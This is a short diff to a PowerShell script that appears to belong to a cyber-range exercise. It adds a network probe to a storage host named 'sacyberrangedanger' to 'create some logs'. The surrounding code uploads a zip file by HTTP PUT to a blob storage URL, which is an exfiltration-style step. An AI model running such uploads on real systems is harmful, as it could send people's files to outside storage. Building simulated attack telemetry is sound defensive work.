@@ -102,6 +102,9 @@ $headers = @{
     "Content-Type"     = $contentType
 }
 
+# Create some logs
+Test-NetConnection -ComputerName sacyberrangedanger.blob.core.windows.net -Port 443
+
 # Upload the blob using Invoke-WebRequest
 Invoke-WebRequest -Uri $storageUrl -Method Put -Headers $headers -InFile $zipFilePath
 
